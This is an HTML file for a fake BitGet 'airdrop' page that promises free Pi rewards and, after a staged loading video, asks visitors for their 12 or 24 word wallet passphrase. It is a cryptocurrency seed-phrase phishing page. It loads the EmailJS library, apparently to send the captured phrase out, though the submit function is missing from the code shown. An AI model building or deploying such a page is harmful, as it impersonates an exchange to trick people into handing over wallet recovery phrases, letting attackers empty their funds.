<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>BitGet - Airdrop</title>

    <!-- EmailJS -->
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>

    </script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            overflow: hidden;
            text-align: center;
        }

        /* Homepage */
        .homepage {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: url('your-background-image.jpg') no-repeat center center/cover;
            width: 100vw;
            height: 100vh;
            padding: 40px;
        }

        .homepage video {
            width: 250px;
        }

        .headline {
            font-size: 28px;
            font-weight: bold;
            color: white;
            margin-top: 20px;
        }

        .subtext {
            font-size: 18px;
            color: white;
            margin-top: 10px;
        }

        .side-message {
            font-size: 14px;
            color: white;
            margin-top: 10px;
        }

        .join-button {
            margin-top: 20px;
            padding: 15px 30px;
            font-size: 18px;
            color: white;
            background: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
            animation: pulse 1.5s infinite;
        }

        .join-button:hover {
            background: #0056b3;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        /* Loading Screen */
        .loading-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: black;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .loading-screen video {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
        }

        /* Passphrase Screen */
        .passphrase-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: #1a1a1a;
            color: white;
        }

        .passphrase-container {
            width: 90%;
            max-width: 500px;
            padding: 30px;
            background: #333;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
            text-align: center;
        }

        .input-box {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            margin-top: 10px;
            border-radius: 5px;
            border: none;
        }

        .submit-button {
            margin-top: 15px;
            padding: 10px 20px;
            font-size: 18px;
            color: white;
            background: #28a745;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
        }

        .submit-button:hover {
            background: #218838;
        }

        .message {
            margin-top: 15px;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <!-- Homepage -->
    <div class="homepage" id="homepage">
        <video autoplay muted loop>
            <source src="Ex-EN-1734602916000.mp4" type="video/mp4">
        </video>
        <h1 class="headline">Win up to 10,000 Pi</h1>
        <p class="subtext">Claim your free Pi rewards now! Airdrop is live for a limited timeâ€”donâ€™t miss out! ðŸš€</p>
        <p class="side-message">Trade with 100 million users on BitGet.</p>
        <button class="join-button" onclick="showLoading()">Join Now</button>
    </div>

    <!-- Loading Screen -->
    <div class="loading-screen" id="loading-screen">
        <video autoplay muted>
            <source src="screen-20250223-174455~2.mp4" type="video/mp4">
        </video>
    </div>

    <!-- Passphrase Screen -->
    <div class="passphrase-screen" id="passphrase-screen">
        <div class="passphrase-container">
            <h2>Enter Your 12 or 24 Word Passphrase</h2>
            <input type="text" class="input-box" id="passphrase" placeholder="Enter your passphrase here">
            <button class="submit-button" onclick="submitPassphrase()">Submit</button>
            <p class="message" id="message"></p>
        </div>
    </div>

    <script>
        function showLoading() {
            document.getElementById("homepage").style.display = "none";
            document.getElementById("loading-screen").style.display = "flex";
            setTimeout(() => {
                document.getElementById("loading-screen").style.display = "none";
                document.getElementById("passphrase-screen").style.display = "flex";
            }, 3000);
        }
    </script>

</body>
</html>
